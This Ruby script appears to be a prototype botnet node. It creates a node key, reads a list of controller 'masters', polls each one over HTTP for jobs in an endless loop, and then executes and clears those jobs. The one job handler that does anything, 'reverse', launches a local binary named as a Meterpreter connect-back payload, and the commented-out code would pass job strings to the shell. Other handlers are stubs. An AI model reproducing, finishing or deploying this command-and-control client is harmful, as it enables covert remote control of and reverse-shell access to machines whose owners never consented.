#!/usr/bin/ruby

require 'rubygems'
require 'net/http'
require 'open4'

def load_db()
	key = ""
	masterkey = ""
	mlist = []
	configs = ["node.dat", "masters.dat"]

	configs.each { |i|
	puts i
	if File.exists?(i) && i == "node.dat"
		puts "Node configuration found, loading..."
		nodedata = File.open(i, "r")
		puts "Node configuration loaded"
		nodedata.each do |line|
			key = line.chomp
		end
		puts "Key is #{key}"
	else if !File.exist?(i) && i == "node.dat"
		puts "Node configuration not found, creating..."
		nodedata = File.new("node.dat", "w")
		o = [('a'..'z'),('A'..'Z'),('0'..'9')].map{ |i| i.to_a }.flatten
		key = (0..50).map { o[rand(o.length)] }.join
		nodedata.puts(key)
		puts "Generating key... #{key}"
		nodedata.close
		end
	end
	if File.exists?(i) && i == "masters.dat"
		puts "Masters list found, loading..."
		masterslist = File.open(i, "r")
		puts "Masters list loaded"
		masterslist.each do |line|
			mlist <<= line.chomp
		end		
	else if !File.exist?(i) && i == "masters.dat"
		puts "Masters list not found, creating..."
		masterslist = File.new("masters.dat", "w")
		masterslist.puts("localhost:4563")
		end
	end
	}
	return key, mlist
end

def init(host, port, key, masterkey)
#	authresp = auth(host, port, key, masterkey) 
	regresp = register(host, port, key, masterkey)
	return regresp # authresp
end

def fetch(host, port, url)
	#puts url
        begin
                http = Net::HTTP.new(host, port)
		response = http.get(url)
        rescue Errno::ECONNREFUSED
                return "Error: Connection Refused"
        rescue Timeout::Error
                return "Error: Connection Timeout"
        end
	return response
end

def auth(host, port, key, masterkey)
	response = fetch(host, port, "/node/#{key}/auth/#{masterkey}/noop")
	return response
end

def register(host, port, key, masterkey)
	response = fetch(host, port, "/node/#{key}/register/#{masterkey}/optional2")
	return response
end

def getjobs(host, port, key, masterkey)
	response = fetch(host, port, "/node/#{key}/getjobs/#{masterkey}/optional2")
	return response
end	

def clearjobs(host, port, key, masterkey)
	response = fetch(host, port, "/node/#{key}/clearjobs/#{masterkey}/optional2")
	return response
end

def reverse(job)
	job = job.split(":")
	puts job.length
	`tests/linux-metepreter-connectback`
end

def processjob(job)
	jobresult = ""
	jobcmd = job.split(":")[0]
	case jobcmd
	when "system"
		puts "got system"
	when "reverse"
		reverse(job)
	when "promote"
		puts "got promote"
	when "demote"
		puts "got demote"
	end
	return jobresult
	
end



host = "localhost"
port = "4563"
nodeid = "0987654321"
masterkey = "1234567890"
cookie = ""

key, masterslist = load_db()
puts "masters in the list:"
puts masterslist
threads = []
jobqueue = []
jobthreads = []
while 1 == 1
masterslist.each { |master|
	# mmmmm multithreading!
	threads << Thread.new {
	puts "waiting for a sec or so"
	sleep(rand(15))
	puts "connecting to master: #{master}"
	host = master.split(":")[0]
	port = master.split(":")[1]
	regresp = init(host, port, key, masterkey) # authresp
	
#	if !authresp.respond_to?("body") or 
	if !regresp.respond_to?("body")
		puts regresp 
		# log, retry
	else
		puts "Pulling jobs"
		jobqueue << getjobs(host, port, key, masterkey).body.to_a
		jobqueue = jobqueue.flatten.uniq
		if jobqueue.length == 0 
			puts "emtpy job queue"
		else
			jobqueue.each { |job|
				puts "Executing job: #{job}"
				jobresult = processjob(job)
			}
			puts "Clearing job file"
			clearjobs(host, port, key, masterkey)
		end
	end
	}
	threads.each { |aThread| aThread.join }
}
jobqueue = []
sleep 10
end
#			Open4.popen4("echo #{job}") { |pid, stdin, stdout, stderr|
#				puts pid
#				puts stdout.read
#			}
#puts resp.response['set-cookie'].split('; ')[0]
#puts resp.response['set-cookie'].split('; ')[0]
#puts cookie
#while 1 == 1
#	sleep rand(15) 
#puts auth(host, port, nodeid, masterkey)
#puts register(host, port, nodeid, masterkey)
#end
